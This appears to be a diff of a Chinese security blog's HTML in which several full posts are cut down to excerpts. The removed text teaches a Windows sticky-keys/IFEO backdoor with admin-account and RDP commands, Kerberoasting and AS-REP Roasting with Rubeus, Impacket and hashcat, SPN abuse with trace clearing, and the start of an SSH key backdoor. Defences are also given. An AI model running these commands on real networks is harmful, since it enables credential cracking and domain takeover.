class="literal">-Force</span> | <span class="built_in">Out-Null</span></span><br><span class="line">    <span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="variable">$key</span> <span class="literal">-Name</span> <span class="string">&quot;Debugger&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span> <span class="literal">-Force</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="9-3-利用与恢复"><a href="#9-3-利用与恢复" class="headerlink" title="9.3 利用与恢复"></a>9.3 利用与恢复</h3><p>在登录界面按5次Shift弹出SYSTEM权限cmd，可添加账户、开启RDP、启动C2载荷：</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user admin P@ssw0rd123 /add</span><br><span class="line"><span class="built_in">net</span> localgroup Administrators admin /add</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d <span class="number">0</span> /f</span><br></pre></td></tr></table></figure>
-
-<p>恢复：<code>reg delete &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /f</code></p>
-<hr>
-<h2 id="十、总结对比"><a href="#十、总结对比" class="headerlink" title="十、总结对比"></a>十、总结对比</h2><table>
-<thead>
-<tr>
-<th>持久化技术</th>
-<th>权限要求</th>
-<th>隐蔽性</th>
-<th>稳定性</th>
-<th>触发时机</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>注册表Run键</td>
-<td>普通用户</td>
-<td>低</td>
-<td>高</td>
-<td>用户登录</td>
-</tr>
-<tr>
-<td>计划任务</td>
-<td>普通用户</td>
-<td>中</td>
-<td>高</td>
-<td>灵活配置</td>
-</tr>
-<tr>
-<td>Windows服务</td>
-<td>管理员</td>
-<td>中</td>
-<td>极高</td>
-<td>系统启动</td>
-</tr>
-<tr>
-<td>DLL劫持</td>
-<td>普通用户</td>
-<td>高</td>
-<td>中</td>
-<td>程序启动</td>
-</tr>
-<tr>
-<td>COM劫持</td>
-<td>普通用户</td>
-<td>极高</td>
-<td>高</td>
-<td>COM调用</td>
-</tr>
-<tr>
-<td>IFEO劫持</td>
-<td>管理员</td>
-<td>高</td>
-<td>高</td>
-<td>目标程序启动</td>
-</tr>
-<tr>
-<td>WMI事件订阅</td>
-<td>管理员</td>
-<td>极高</td>
-<td>极高</td>
-<td>事件触发</td>
-</tr>
-<tr>
-<td>Office插件</td>
-<td>普通用户</td>
-<td>高</td>
-<td>高</td>
-<td>Office启动</td>
-</tr>
-<tr>
-<td>Sticky Keys</td>
-<td>管理员</td>
-<td>高</td>
-<td>极高</td>
-<td>手动触发</td>
-</tr>
-</tbody></table>
-<h3 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h3><ol>
-<li><strong>监控注册表</strong>：重点关注Run、RunOnce、IFEO、CLSID等敏感键值变更</li>
-<li><strong>审计计划任务</strong>：定期审查 <code>schtasks</code> 输出</li>
-<li><strong>WMI审计</strong>：启用WMI日志，监控 <code>__EventFilter</code>&#x2F;<code>__EventConsumer</code> 创建</li>
-<li><strong>文件完整性监控</strong>：监控System32下辅助程序（sethc.exe等）哈希变化</li>
-<li><strong>最小权限原则</strong>：普通用户不应具有管理员权限</li>
-<li><strong>启用WDAC&#x2F;AppLocker</strong>：限制非受信路径可执行文件运行</li>
-</ol>
-<hr>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1547/">MITRE ATT&amp;CK: Boot or Logon Autostart Execution (T1547)</a></li>
-<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1053/">MITRE ATT&amp;CK: Scheduled Task&#x2F;Job (T1053)</a></li>
-<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1574/">MITRE ATT&amp;CK: Hijack Execution Flow (T1574)</a></li>
-<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1546/">MITRE ATT&amp;CK: Event Triggered Execution (T1546)</a></li>
-<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-architecture">Microsoft Docs: WMI Architecture</a></li>
-</ul>
-<hr>
-<blockquote>
-<p><strong>免责声明：本文所述内容仅供网络安全研究与授权渗透测试参考。任何未经授权利用本文技术对系统进行攻击的行为均属违法，使用者需承担相应法律责任。作者不对任何滥用行为负责。</strong></p>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
 
     
 
@@ -511,7 +220,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -533,136 +242,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在Active Directory域环境中，Kerberos协议是默认的身份认证机制。攻击者在获得域内任意一个普通用户权限后，可以利用Kerberos协议的设计特性，离线破解服务账户的明文密码——这类攻击统称为”Kerberoasting”。其威力在于不需要提权、不需要横向移动，只凭一个普通域用户身份即可发起。与其原理相似但攻击路径不同的还有AS-REP Roasting，它甚至不需要任何认证即可完成攻击。本文将从SPN概念出发，系统性地梳理这两种攻击的原理、工具链与防御策略。</p>
-<h2 id="一、SPN（Service-Principal-Name）"><a href="#一、SPN（Service-Principal-Name）" class="headerlink" title="一、SPN（Service Principal Name）"></a>一、SPN（Service Principal Name）</h2><p>SPN是Kerberos体系中用于唯一标识服务实例的名称，标准格式为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serviceclass/host:port/servicename</span><br></pre></td></tr></table></figure>
-
-<p>常见示例：<code>HTTP/webserver.domain.local</code>、<code>MSSQLSvc/sql01.domain.local:1433</code>、<code>CIFS/dc01.domain.local</code>。</p>
-<p>SPN记录存储在Active Directory的<code>servicePrincipalName</code>属性中，通常与域用户（服务账户）或计算机账户关联。对攻击者而言，SPN是一份”服务清单”——通过枚举域内所有SPN可快速发现Web服务、数据库、域控等关键资产。更关键的是，任何拥有SPN的账户，其TGS票据（Ticket Granting Service）都可以被域内任意用户申请并导出，这正是Kerberoasting攻击的基础。</p>
-<h2 id="二、Kerberoasting攻击原理"><a href="#二、Kerberoasting攻击原理" class="headerlink" title="二、Kerberoasting攻击原理"></a>二、Kerberoasting攻击原理</h2><p>Kerberos认证涉及三个阶段：</p>
-<ol>
-<li><strong>AS-REQ &#x2F; AS-REP</strong>：用户向KDC证明身份，获得TGT（Ticket Granting Ticket）。</li>
-<li><strong>TGS-REQ &#x2F; TGS-REP</strong>：用户使用TGT向KDC申请访问特定服务的服务票据（Service Ticket&#x2F;ST）。</li>
-<li><strong>AP-REQ &#x2F; AP-REP</strong>：用户使用ST向目标服务发起认证。</li>
-</ol>
-<p>Kerberoasting的关键在第二阶段。KDC使用<strong>服务账户的NTLM哈希</strong>加密ST的某一部分后返回给用户。攻击者可将ST导出到离线环境，通过字典或暴力破解恢复服务账户的明文密码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">普通域用户 --&gt; 枚举SPN --&gt; 请求TGS票据 --&gt; 导出加密ST</span><br><span class="line">    --&gt; 离线破解（hashcat / john） --&gt; 获得明文密码</span><br></pre></td></tr></table></figure>
-
-<p><strong>攻击条件</strong>：拥有有效域用户凭据（无需高权限）、目标注册了SPN、服务账户密码强度低。</p>
-<h2 id="三、Rubeus-GetUserSPNs"><a href="#三、Rubeus-GetUserSPNs" class="headerlink" title="三、Rubeus GetUserSPNs"></a>三、Rubeus GetUserSPNs</h2><p>Rubeus是GhostPack团队开发的C#工具，集成了多种Kerberos攻击功能，是Kerberoasting的首选工具。</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 枚举域内所有SPN并请求TGS票据</span></span><br><span class="line">Rubeus.exe kerberoast</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定域控制器与输出文件</span></span><br><span class="line">Rubeus.exe kerberoast /domain:corp.local /dc:dc01.corp.local /outfile:hashes.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 筛选高价值目标（指定SPN或LDAP过滤器）</span></span><br><span class="line">Rubeus.exe kerberoast /spn:MSSQLSvc/sql01.corp.local</span><br><span class="line">Rubeus.exe kerberoast /ldapfilter:<span class="string">&quot;admincount=1&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>Rubeus输出的Hash格式为Hashcat mode 13100（RC4-HMAC），形如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5tgs$23$*user$domain$MSSQLSvc/sql01.corp.local*$hex$hex...</span><br></pre></td></tr></table></figure>
-
-<p>其中<code>$23$</code>表示RC4加密类型，这是最易破解的类型。AES加密（<code>$18$</code>）的破解难度极大，实际攻击中攻击者更关注RC4票据。</p>
-<h2 id="四、Impacket-GetUserSPNs"><a href="#四、Impacket-GetUserSPNs" class="headerlink" title="四、Impacket-GetUserSPNs"></a>四、Impacket-GetUserSPNs</h2><p>Impacket工具集中的GetUserSPNs.py是Python实现的Kerberoasting工具，适用于非Windows攻击环境。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 枚举所有SPN并请求TGS票据（明文密码认证）</span></span><br><span class="line">impacket-GetUserSPNs -request -dc-ip 192.168.1.10 corp.local/user:password</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用NTLM哈希认证（Pass-the-Hash）</span></span><br><span class="line">impacket-GetUserSPNs -request -dc-ip 192.168.1.10 \</span><br><span class="line">    -hashes :&lt;ntlm_hash&gt; corp.local/user</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定目标用户并保存到文件</span></span><br><span class="line">impacket-GetUserSPNs -request -dc-ip 192.168.1.10 \</span><br><span class="line">    corp.local/user:password -request-user sql_svc -outputfile hashes.txt</span><br></pre></td></tr></table></figure>
-
-<h2 id="五、Hashcat破解TGS票据"><a href="#五、Hashcat破解TGS票据" class="headerlink" title="五、Hashcat破解TGS票据"></a>五、Hashcat破解TGS票据</h2><h3 id="5-1-Mode-13100（RC4加密）"><a href="#5-1-Mode-13100（RC4加密）" class="headerlink" title="5.1 Mode 13100（RC4加密）"></a>5.1 Mode 13100（RC4加密）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基础字典攻击</span></span><br><span class="line">hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 规则+字典（组合爆破）</span></span><br><span class="line">hashcat -m 13100 -a 0 hashes.txt dict.txt -r best64.rule</span><br><span class="line"></span><br><span class="line"><span class="comment"># 掩码攻击（8位所有可打印字符）</span></span><br><span class="line">hashcat -m 13100 -a 3 hashes.txt ?a?a?a?a?a?a?a?a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 混合攻击（字典+掩码后缀）</span></span><br><span class="line">hashcat -m 13100 -a 6 hashes.txt dict.txt ?d?d?d?d</span><br><span class="line"></span><br><span class="line"><span class="comment"># GPU优化模式</span></span><br><span class="line">hashcat -m 13100 -a 0 -O -w 3 hashes.txt dict.txt</span><br></pre></td></tr></table></figure>
-
-<h3 id="5-2-Mode-19700（AES加密）"><a href="#5-2-Mode-19700（AES加密）" class="headerlink" title="5.2 Mode 19700（AES加密）"></a>5.2 Mode 19700（AES加密）</h3><p>当TGS票据使用AES-256加密时，对应mode 19700。破解速度极慢，除非目标密码极弱（如纯数字短密码），否则不具备实际破解性。<strong>这也是防御Kerberoasting的关键策略之一——强制域内使用AES加密。</strong></p>
-<h3 id="5-3-定制化破解策略"><a href="#5-3-定制化破解策略" class="headerlink" title="5.3 定制化破解策略"></a>5.3 定制化破解策略</h3><p>基于目标组织的密码策略和命名规范生成定制字典，是提高破解成功率的核心。例如已知某公司采用<code>SeasonYear!</code>模式，可使用hashcat的规则组合<code>(Summer|Winter|Spring)(20\d{2})!</code>快速爆破。</p>
-<h2 id="六、AS-REP-Roasting：无需认证的攻击"><a href="#六、AS-REP-Roasting：无需认证的攻击" class="headerlink" title="六、AS-REP Roasting：无需认证的攻击"></a>六、AS-REP Roasting：无需认证的攻击</h2><h3 id="6-1-攻击原理"><a href="#6-1-攻击原理" class="headerlink" title="6.1 攻击原理"></a>6.1 攻击原理</h3><p>AS-REP Roasting攻击Kerberos认证的<strong>第一阶段</strong>。当域用户启用了”不要求Kerberos预身份认证”（UF_DONT_REQUIRE_PREAUTH，userAccountControl标志位4194304）时，攻击者可在<strong>不知道密码的情况下</strong>，以该用户身份向KDC发送AS-REQ请求。KDC会返回使用用户NTLM哈希加密的AS-REP响应，攻击者将其离线破解：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击者 --&gt; 伪造AS-REQ（声称是目标用户） --&gt; KDC返回AS-REP</span><br><span class="line">    --&gt; 导出加密部分 --&gt; 离线破解（hashcat mode 18200）</span><br><span class="line">    --&gt; 获得目标用户明文密码</span><br></pre></td></tr></table></figure>
-
-<h3 id="6-2-枚举与攻击执行"><a href="#6-2-枚举与攻击执行" class="headerlink" title="6.2 枚举与攻击执行"></a>6.2 枚举与攻击执行</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 枚举关闭预认证的用户（PowerView）</span></span><br><span class="line"><span class="built_in">Get-DomainUser</span> <span class="literal">-PreauthNotRequired</span> <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Rubeus一键执行AS-REP Roasting</span></span><br><span class="line">Rubeus.exe asreproast /outfile:asrep_hashes.txt</span><br><span class="line">Rubeus.exe asreproast /user:targetuser /outfile:target.hash</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Impacket方式——无需任何域凭据</span></span><br><span class="line">impacket-GetNPUsers -dc-ip 192.168.1.10 corp.local/ -usersfile users.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定单个用户</span></span><br><span class="line">impacket-GetNPUsers -dc-ip 192.168.1.10 corp.local/targetuser -no-pass</span><br><span class="line"></span><br><span class="line"><span class="comment"># 批量输出为hashcat格式</span></span><br><span class="line">impacket-GetNPUsers -dc-ip 192.168.1.10 corp.local/ \</span><br><span class="line">    -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt</span><br></pre></td></tr></table></figure>
-
-<h3 id="6-3-Hashcat-Mode-18200"><a href="#6-3-Hashcat-Mode-18200" class="headerlink" title="6.3 Hashcat Mode 18200"></a>6.3 Hashcat Mode 18200</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># AS-REP Hash格式：$krb5asrep$23$user@domain:hash...</span></span><br><span class="line">hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt</span><br><span class="line">hashcat -m 18200 -a 0 -O -w 3 asrep_hashes.txt dict.txt -r best64.rule</span><br></pre></td></tr></table></figure>
-
-<h2 id="七、SetSPN在攻击链中的利用"><a href="#七、SetSPN在攻击链中的利用" class="headerlink" title="七、SetSPN在攻击链中的利用"></a>七、SetSPN在攻击链中的利用</h2><p>SetSPN.exe是Windows原生SPN管理工具。在Kerberoasting攻击中，SetSPN与ACL滥用结合可实现攻击面的扩展。</p>
-<p>当攻击者拥有的账户对另一个域用户具有GenericWrite或WriteProperty权限时，可以为其添加SPN，随后对该账户执行Kerberoasting：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 为目标用户添加SPN（需要写权限）</span></span><br><span class="line">setspn <span class="literal">-s</span> HTTP/temp.corp.local target_user</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或通过PowerShell AD模块</span></span><br><span class="line"><span class="built_in">Set-ADUser</span> <span class="literal">-Identity</span> target_user <span class="literal">-Add</span> <span class="selector-tag">@</span>&#123;</span><br><span class="line">    <span class="string">&quot;servicePrincipalName&quot;</span> = <span class="string">&quot;TEST/test.corp.local&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行Kerberoasting获取TGS票据</span></span><br><span class="line">Rubeus.exe kerberoast /user:target_user</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清除痕迹</span></span><br><span class="line"><span class="built_in">Set-ADUser</span> <span class="literal">-Identity</span> target_user <span class="literal">-Clear</span> servicePrincipalName</span><br></pre></td></tr></table></figure>
-
-<p>这种攻击链在BloodHound中表现为”GenericWrite → Force SPN Change → Kerberoast”路径，是内网渗透中的经典提权路线。</p>
-<h2 id="八、两种攻击对比与破解效率"><a href="#八、两种攻击对比与破解效率" class="headerlink" title="八、两种攻击对比与破解效率"></a>八、两种攻击对比与破解效率</h2><table>
-<thead>
-<tr>
-<th>维度</th>
-<th>Kerberoasting</th>
-<th>AS-REP Roasting</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>所需权限</td>
-<td>任意域用户</td>
-<td><strong>无需任何凭据</strong></td>
-</tr>
-<tr>
-<td>攻击目标</td>
-<td>注册了SPN的服务账户</td>
-<td>关闭预认证的账户</td>
-</tr>
-<tr>
-<td>Kerberos阶段</td>
-<td>TGS-REP</td>
-<td>AS-REP</td>
-</tr>
-<tr>
-<td>Hashcat Mode</td>
-<td>13100 (RC4) &#x2F; 19700 (AES)</td>
-<td>18200</td>
-</tr>
-<tr>
-<td>破解速度(RTX 4090)</td>
-<td>~2.5 GH&#x2F;s</td>
-<td>~85 MH&#x2F;s</td>
-</tr>
-<tr>
-<td>利用场景</td>
-<td>提权、横向移动</td>
-<td>初始突破、发现弱密码</td>
-</tr>
-<tr>
-<td>目标特征</td>
-<td>高权限服务账户</td>
-<td>遗留账户、配置不当的用户</td>
-</tr>
-</tbody></table>
-<p>实际渗透中，Kerberoasting的RC4票据破解速度约为AS-REP的30倍，因此服务账户的弱密码风险远高于普通用户。但AS-REP Roasting的价值在于<strong>零门槛</strong>——无需任何凭据即可发起，适合外网打点场景。</p>
-<h2 id="九、防御措施"><a href="#九、防御措施" class="headerlink" title="九、防御措施"></a>九、防御措施</h2><h3 id="9-1-账户与密码管理"><a href="#9-1-账户与密码管理" class="headerlink" title="9.1 账户与密码管理"></a>9.1 账户与密码管理</h3><ul>
-<li><strong>使用组托管服务账户（gMSA）</strong>：Windows Server 2012及以上支持，AD自动管理复杂度随机密码轮换，攻击者即使拿到票据也无法破解——这是对抗Kerberoasting的最有效手段。</li>
-<li><strong>服务账户强密码</strong>：如无法使用gMSA，至少设置25位以上随机密码，使用密码管理器生成。</li>
-<li><strong>定期审计SPN</strong>：使用BloodHound或脚本检查不必要的SPN注册并及时移除。</li>
-<li><strong>审计预认证设置</strong>：定期检查关闭预认证的用户（userAccountControl标志位4194304）：</li>
-</ul>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> &#123;DoesNotRequirePreAuth <span class="operator">-eq</span> <span class="variable">$true</span>&#125; \</span><br><span class="line">    <span class="literal">-Properties</span> DoesNotRequirePreAuth</span><br></pre></td></tr></table></figure>
-
-<h3 id="9-2-加密策略"><a href="#9-2-加密策略" class="headerlink" title="9.2 加密策略"></a>9.2 加密策略</h3><p>在组策略中配置Kerberos仅使用AES-256加密类型，禁止RC4：</p>
-<ul>
-<li><strong>组策略路径</strong>：<code>Computer Configuration\Policies\Windows Settings\Security Settings\Local Policies\Security Options\Network security: Configure encryption types allowed for Kerberos</code></li>
-<li>虽然AES票据理论上也可破解（mode 19700），但计算速度极慢，实际威慑力显著。</li>
-</ul>
-<h3 id="9-3-监控与检测"><a href="#9-3-监控与检测" class="headerlink" title="9.3 监控与检测"></a>9.3 监控与检测</h3><ul>
-<li><strong>Event ID 4769</strong>：大量TGS-REQ请求，尤其是Ticket Encryption Type为0x17（RC4）的大量申请，需立即排查。</li>
-<li><strong>Event ID 4768</strong>：Pre-Authentication Type为0的TGT请求，来自异常IP时需要关注。</li>
-<li><strong>蜜罐账户</strong>：创建带有弱密码和SPN的蜜罐服务账户，任何人对其执行Kerberoasting即告警——这是检测攻击行为的高性价比手段。</li>
-<li><strong>网络分段</strong>：限制普通用户网段直接访问域控88端口，通过IDS&#x2F;IPS检测异常Kerberos流量模式。</li>
-</ul>
-<h3 id="9-4-审计脚本"><a href="#9-4-审计脚本" class="headerlink" title="9.4 审计脚本"></a>9.4 审计脚本</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定期审计所有SPN注册账户</span></span><br><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> &#123;ServicePrincipalName <span class="operator">-like</span> <span class="string">&quot;*&quot;</span>&#125; \</span><br><span class="line">    <span class="literal">-Properties</span> ServicePrincipalName |</span><br><span class="line">    <span class="built_in">Select-Object</span> Name, SamAccountName, ServicePrincipalName |</span><br><span class="line">    <span class="built_in">Export-Csv</span> <span class="literal">-Path</span> <span class="string">&quot;SPN_Audit_<span class="variable">$</span>(Get-Date -Format yyyyMMdd).csv&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="十、实战场景"><a href="#十、实战场景" class="headerlink" title="十、实战场景"></a>十、实战场景</h2><h3 id="场景一：经典Kerberoasting提权"><a href="#场景一：经典Kerberoasting提权" class="headerlink" title="场景一：经典Kerberoasting提权"></a>场景一：经典Kerberoasting提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 钓鱼获得普通域用户 user01 / Summer2024!</span><br><span class="line">2. BloodHound枚举SPN -&gt; 发现MSSQLSvc关联sql_svc账户</span><br><span class="line">3. Rubeus.exe kerberoast 导出TGS票据</span><br><span class="line">4. hashcat -m 13100 字典破解 -&gt; sql_svc:Summer2024!</span><br><span class="line">5. sql_svc属于Domain Admins组 -&gt; 域完全控制</span><br></pre></td></tr></table></figure>
-
-<h3 id="场景二：AS-REP-Roasting外网打点"><a href="#场景二：AS-REP-Roasting外网打点" class="headerlink" title="场景二：AS-REP Roasting外网打点"></a>场景二：AS-REP Roasting外网打点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. LDAP匿名查询枚举域用户列表</span><br><span class="line">2. impacket-GetNPUsers批量探测关闭预认证的用户</span><br><span class="line">3. 发现backup用户易受AS-REP Roasting攻击</span><br><span class="line">4. hashcat -m 18200 破解 -&gt; backup:Admin123!</span><br><span class="line">5. 使用backup凭据获取域内初始立足点</span><br></pre></td></tr></table></figure>
-
-<h3 id="场景三：SetSPN权限滥用提权"><a href="#场景三：SetSPN权限滥用提权" class="headerlink" title="场景三：SetSPN权限滥用提权"></a>场景三：SetSPN权限滥用提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. BloodHound发现user01对helpdesk_svc有GenericWrite权限</span><br><span class="line">2. Set-ADUser为helpdesk_svc添加SPN</span><br><span class="line">3. Rubeus kerberoast获取helpdesk_svc的TGS票据</span><br><span class="line">4. hashcat破解获得密码 -&gt; Domain Admins组成员</span><br><span class="line">5. Set-ADUser清除SPN，抹去痕迹</span><br></pre></td></tr></table></figure>
-
-<h2 id="十一、免责声明"><a href="#十一、免责声明" class="headerlink" title="十一、免责声明"></a>十一、免责声明</h2><blockquote>
-<p><strong>本文所讨论的技术和方法仅供安全研究与授权的渗透测试使用。</strong></p>
-<p>未经系统所有者明确书面授权，对计算机系统进行任何形式的攻击、渗透测试或安全评估均属违法行为，可能违反《中华人民共和国网络安全法》《刑法》等相关法律法规。作者不承担因读者不当使用本文所述技术而导致的任何法律责任。</p>
-<p>如果您是网络防御者，请利用本文知识加固您的Active Directory环境，定期审计SPN配置，确保所有服务账户使用gMSA或强密码策略。</p>
-<p><strong>记住：技术无善恶，但使用技术的人有选择。用这些知识保护系统，而不是破坏它。</strong></p>
-</blockquote>
-<h2 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://files.sans.org/summit/hackfest2014/PDFs/Kerberoasting.pdf">Tim Medin - Kerberoasting (SANS Hackfest 2014)</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">Rubeus - GhostPack</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/fortra/impacket">Impacket - Fortra</a></li>
-<li><a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=example_hashes">Hashcat Example Hashes</a></li>
-<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview">gMSA Overview - Microsoft Learn</a></li>
-</ul>
-
+          <p>Kerberoasting 与 AS-REP Roasting——SPN 服务账户密码爆破与 Hashcat 破解。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/Intranet-Kerberoasting/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -724,7 +312,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -746,280 +334,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在渗透测试中，获取目标系统的初始访问权限只是第一步。如何长期、稳定地维持对该系统的控制，即”权限维持”（Persistence），是后渗透阶段的核心任务之一。Linux 作为服务器端的主流操作系统，其权限维持手法种类繁多，覆盖了从简单的计划任务到复杂的内核级 rootkit。本文将从实战角度出发，详细介绍八种常见的 Linux 权限维持技术。</p>
-<blockquote>
-<p><strong>免责声明</strong>：本文所述技术仅用于安全研究和授权的渗透测试活动。未经授权对计算机系统进行攻击属于违法行为，作者不对任何滥用行为承担责任。</p>
-</blockquote>
-<hr>
-<h2 id="一、SSH-authorized-keys-后门"><a href="#一、SSH-authorized-keys-后门" class="headerlink" title="一、SSH authorized_keys 后门"></a>一、SSH authorized_keys 后门</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>SSH 是基于公钥认证的远程登录协议。<code>~/.ssh/authorized_keys</code> 文件中保存了允许免密登录的公钥。如果攻击者能够将自己的公钥写入该文件，即可实现对目标主机的免密 SSH 登录，这是最直接、最隐蔽的权限维持方式之一。</p>
